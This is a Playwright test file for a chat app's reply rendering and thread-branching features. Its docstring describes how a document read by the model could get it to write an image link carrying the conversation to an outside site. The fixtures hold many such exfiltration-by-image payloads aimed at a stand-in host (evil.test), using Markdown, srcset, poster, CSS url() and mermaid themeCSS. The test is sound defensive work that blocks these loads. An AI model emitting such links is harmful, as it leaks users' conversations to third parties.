"""Images in replies wait to be asked for, and the rest of a thread can be moved into a branch.
  - A reply can't make the browser fetch anything from another site by itself (a document can tell the model to write
    ![](https://site/?q=<the conversation>)): a Markdown or HTML image from another site is a placeholder saying where
    it's from, with no text of its own (so anchors count the same); srcset, a video poster, CSS url() in a style
    attribute or a <style>, an svg <image>, and a diagram's own CSS (%%{init: {themeCSS}}%%) load nothing. An image from this
    page (data:) shows as before. The placeholder's button loads that image, and only it. A branch anchored after
    the image still lands on its words.
  - A reply with messages after it has ⋯ → "Move what follows into a branch": the thread ends at that reply, the rest
    is a branch whose messages are the same, each seeing what it saw before; a chip under the reply opens it. Undo
    puts it back. The thread then goes on from the reply (the chip gives way to the versions switcher), and deleting
    the moved branch (its chip's 🗑) is rewinding. The last reply has no ⋯ (nothing follows it).
Asserts and exits non-zero."""
import asyncio, base64, json, struct, sys, zlib
from playwright.async_api import async_playwright
from common import launch_args, goto_app, booted, frames, soon, answered, saved, OUT

fails = []
def check(name, ok, detail=''):
    print(('ok   ' if ok else 'FAIL ') + name, '' if ok else str(detail)[:300])
    if not ok: fails.append(name)

def png(w, h, rgb):
    raw = b''.join(b'\0' + bytes(rgb) * w for _ in range(h))
    chunk = lambda t, d: struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t + d))
    return b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)) + chunk(b'IDAT', zlib.compress(raw)) + chunk(b'IEND', b'')

PNG = png(40, 20, (200, 30, 30))
LOCAL = 'data:image/png;base64,' + base64.b64encode(PNG).decode()
A1 = f"""Here is the chart. ![Sales chart](https://evil.test/a.png?d=secret+words) Alpha after image.

<img src="https://evil.test/b.png" alt="raw"> <img srcset="https://evil.test/c.png 1x" alt="srcset">

<video poster="https://evil.test/d.png"></video>

<div style="background:url(https://evil.test/e.png)">Styled block.</div>

<p style="background-image:u\\72l(https://evil.test/h.png)">Escaped url.</p>

<style>body{{background:url(https://evil.test/f.png)}}</style>

<svg width="10" height="10"><image href="https://evil.test/g.png" width="10" height="10"/></svg>

![Local picture]({LOCAL})

Bravo target words here."""
A2 = """A diagram:

```mermaid
%%{init: {'themeCSS': '.node rect { fill: url(https://evil.test/m1.png) }'}}%%
graph TD
  A[Start] --> B[End]
```

Done."""
SEED = r"""
const now = Date.now(), M = (id, role, content, ts) => ({id, role, thread: 'main', content, ts: now - 60000 + ts, ver: 0, ...(role === 'assistant' ? {model: 'sonnet'} : {})});
const msgs = {q1: M('q1', 'user', 'Show me the chart', 1), a1: M('a1', 'assistant', %s, 2), q2: M('q2', 'user', 'Draw it', 3),
  a2: M('a2', 'assistant', %s, 4), q3: M('q3', 'user', 'One more thing', 5), a3: M('a3', 'assistant', 'The last answer.', 6)};
localStorage.setItem('fakesrv:convs/cr', JSON.stringify({id: 'cr', title: 'Rest', created: now, updated: now, rev: 1,
  threads: {main: {id: 'main', parent: null, title: 'Main thread', colorIdx: -1}}, msgs, order: {main: ['q1', 'a1', 'q2', 'a2', 'q3', 'a3']}, nextColor: 0}));
localStorage.setItem('fakesrv:layout/cr', JSON.stringify({devices: {other: {at: now, ui: {open: ['main'], collapsed: [], layout: 'cols', view: 'panes', sizes: {}}}}}));
""" % (json.dumps(A1), json.dumps(A2))
FAKE = "window.fakeLLM = {use: async () => async (m, o) => { const t = 'Fresh answer. ![x](https://evil.test/s.png)'; o.onText && o.onText({text: t}); return {text: t}; }};"
C = '__digress.conv'
MSG = lambda mid: f'.pane[data-tid=main] .msg[data-mid="{mid}"]'

async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(**launch_args())
        pg = await b.new_page(viewport={'width': 1300, 'height': 900})
        errs = []; pg.on('pageerror', lambda e: errs.append(str(e)))
        evil = []
        async def bad(r):
            evil.append(r.request.url); await r.fulfill(body=PNG, content_type='image/png')
        await pg.route('https://evil.test/**', bad)
        await pg.add_init_script(SEED); await pg.add_init_script(FAKE)
        await goto_app(pg); await booted(pg)
        drew = await soon(pg, f"!!document.querySelector('{MSG('a2')} .mm-view svg')", timeout=20000)
        await frames(pg, 4)

        # ---- images in replies
        check('nothing was fetched from another site', evil == [], evil)
        ph = pg.locator(f'{MSG("a1")} .rimg')
        check('the three images from another site are placeholders (one given only by srcset)', await ph.count() == 3, await ph.count())
        lab = await pg.evaluate(f"[...document.querySelectorAll('{MSG('a1')} .rimg .rtx')].map(x=>x.dataset.label+' | '+x.dataset.url)")
        check('…saying what and where from (with the address)', lab and lab[0].startswith('Image: Sales chart · from evil.test') and 'evil.test/a.png?d=secret' in lab[0], lab)
        check('…with no text of their own', await pg.evaluate(f"[...document.querySelectorAll('{MSG('a1')} .rimg')].every(x=>x.textContent==='')"))
        check('the image from this page shows', await pg.locator(f'{MSG("a1")} img[alt="Local picture"]').count() == 1)
        check('no broken image, srcset, poster or outside CSS left', await pg.evaluate(f"[...document.querySelectorAll('{MSG('a1')} img')].every(i=>i.getAttribute('src'))") and await pg.evaluate(f"""(()=>{{const b=document.querySelector('{MSG('a1')} .body');
          return !b.querySelector('[srcset],[poster]') && ![...b.querySelectorAll('[style]')].some(x=>/url|\\\\/.test(x.getAttribute('style'))) && ![...b.querySelectorAll('style')].some(x=>/evil/.test(x.textContent)) && !b.querySelector('image[href],image')?.getAttribute('href')}})()"""))
        check('the diagram still drew, its own CSS from %%{init}%% left out', drew and await pg.evaluate(f"!/evil\\.test/.test(document.querySelector('{MSG('a2')} .mm-view').innerHTML)"))
        check('…keeping its colors (its <style> is still there)', await pg.evaluate(f"[...document.querySelectorAll('{MSG('a2')} .mm-view style')].some(s=>s.textContent.length>100)"))
        await pg.screenshot(path=OUT + '/reply_images_placeholder.png')
        # a branch anchored on text after the image lands on it (anchors count no placeholder text)
        await pg.evaluate("""() => { const b=document.querySelector('.pane[data-tid=main] .msg[data-mid="a1"] .body');
          const w=document.createTreeWalker(b,NodeFilter.SHOW_TEXT); let n; while((n=w.nextNode())){const i=n.nodeValue.indexOf('target'); if(i>=0){
          const r=document.createRange(); r.setStart(n,i); r.setEnd(n,i+6); const s=getSelection(); s.removeAllRanges(); s.addRange(r); break}}
          document.dispatchEvent(new MouseEvent('mouseup',{bubbles:true})); }""")
        await pg.locator('#popIn').fill('Why target?'); await answered(pg, pg.locator('#popIn').press('Enter'))
        await pg.evaluate("__digress.refresh()"); await frames(pg, 3)
        check('a branch on words after the image is marked on them', await pg.evaluate(f"[...document.querySelectorAll('{MSG('a1')} .anchor')].map(x=>x.textContent).join('')") == 'target')
        check('…and the reply in that branch has its image waiting too', await pg.locator('.msg.assistant .rimg').count() >= 3 and evil == [], evil)
        await pg.locator(f'{MSG("a1")} .rimg').first.locator('[data-rload]').click()
        await soon(pg, f"!!document.querySelector('{MSG('a1')} img[src^=\"https://evil.test/a.png\"]')")
        check('its button loads that image, and only it', evil == ['https://evil.test/a.png?d=secret+words'], evil)
        check('…the others still wait', await pg.locator(f'{MSG("a1")} .rimg').count() == 2)
        await pg.evaluate("__digress.refresh()"); await frames(pg)
        check('…and stays loaded when the reply is drawn again', await pg.locator(f'{MSG("a1")} img[src^="https://evil.test/a.png"]').count() == 1)

        # ---- move what follows into a branch
        check('the last reply has no ⋯', await pg.locator(f'{MSG("a3")} [data-act=rmore]').count() == 0)
        before = await pg.evaluate(f"['q2','a2','q3','a3'].map(id=>JSON.stringify(ThreadOps.signature({C},id)))")
        await pg.locator(f'{MSG("a1")} [data-act=rmore]').click()
        await pg.locator('#replyMenu [data-rm=moverest]').click(); await frames(pg)
        alt = await pg.evaluate(f"Object.values({C}.threads).find(t=>t.alt&&t.anchorMsg==='a1')")
        main_now = await pg.evaluate(f"[...{C}.order.main]")
        check('main ends at the reply', main_now == ['q1', 'a1'], main_now)
        check('…the rest is a branch, the same messages in order', alt and await pg.evaluate(f"[...{C}.order['{alt['id']}']]") == ['q2', 'a2', 'q3', 'a3'], alt)
        check('…named after its first question', alt and alt['title'] == 'Draw it', alt)
        check('…the shape is valid', await pg.evaluate(f"ThreadOps.check({C})") == [])
        after = await pg.evaluate(f"['q2','a2','q3','a3'].map(id=>JSON.stringify(ThreadOps.signature({C},id)))")
        check('…every moved message sees what it saw before', after == before, [before, after])
        chip = pg.locator(f'{MSG("a1")} .bchip[data-tid="{alt["id"]}"]')
        check('a chip under the reply opens it', await chip.count() == 1)
        check('the pane no longer shows the moved messages', await pg.locator(f'{MSG("q2")}').count() == 0)
        check('the reply has no ⋯ now (nothing follows it)', await pg.locator(f'{MSG("a1")} [data-act=rmore]').count() == 0)
        await pg.screenshot(path=OUT + '/reply_rest_moved.png')
        await pg.locator('#toast .tact').click(); await frames(pg)
        check('Undo puts it back', await pg.evaluate(f"[...{C}.order.main]") == ['q1', 'a1', 'q2', 'a2', 'q3', 'a3'] and await pg.evaluate(f"!{C}.threads['{alt['id']}']"))
        check('…and the messages show again', await pg.locator(MSG('q3')).count() == 1)

        # again, then go on from the reply, then delete the moved branch (rewind)
        await pg.locator(f'{MSG("a1")} [data-act=rmore]').click()
        await pg.locator('#replyMenu [data-rm=moverest]').click(); await frames(pg)
        alt = await pg.evaluate(f"Object.values({C}.threads).find(t=>t.alt&&t.anchorMsg==='a1').id")
        ta = pg.locator('.pane[data-tid=main] textarea')
        await ta.fill('Another direction'); await answered(pg, ta.press('Enter'))
        nq = await pg.evaluate(f"{C}.order.main[2]")
        check('the thread goes on from the reply', await pg.evaluate(f"{C}.msgs['{nq}'].content") == 'Another direction')
        check('…the chip gives way to the versions switcher on the new question', await pg.locator(f'{MSG("a1")} .bchip[data-tid="{alt}"]').count() == 0 and await pg.locator(f'{MSG(nq)} .vchip').count() == 1)
        check('…and the reply has ⋯ again', await pg.locator(f'{MSG("a1")} [data-act=rmore]').count() == 1)
        check('the new reply’s outside image waits too', await pg.locator('.pane[data-tid=main] .msg.assistant').last.locator('.rimg').count() == 1 and evil == ['https://evil.test/a.png?d=secret+words'], evil)
        # rewind: move what follows again (the new turn) and delete it from its chip
        await pg.locator(f'{MSG("a1")} [data-act=rmore]').click()
        await pg.locator('#replyMenu [data-rm=moverest]').click(); await frames(pg)
        alt2 = await pg.evaluate(f"Object.values({C}.threads).find(t=>t.alt&&t.anchorMsg==='a1'&&t.id!=='{alt}').id")
        check('both moved parts have a chip under the reply now', await pg.locator(f'{MSG("a1")} .bchip[data-tid="{alt}"]').count() == 1 and await pg.locator(f'{MSG("a1")} .bchip[data-tid="{alt2}"]').count() == 1)
        await pg.locator(f'{MSG("a1")} .bchip[data-tid="{alt2}"] .bx').click()
        await pg.locator('#modal.show #mOk').click(); await frames(pg)
        check('deleting a moved part from its chip drops it (rewinding)', await pg.evaluate(f"!{C}.threads['{alt2}'] && !{C}.msgs['{nq}'] && {C}.order.main.length===2"))
        check('…and the shape is valid', await pg.evaluate(f"ThreadOps.check({C})") == [])
        await saved(pg)
        check('no page errors', not errs, errs[:3])
        await b.close()
    print('\nall passed' if not fails else f'\n{len(fails)} failed: {fails}')
    sys.exit(1 if fails else 0)

asyncio.run(main())
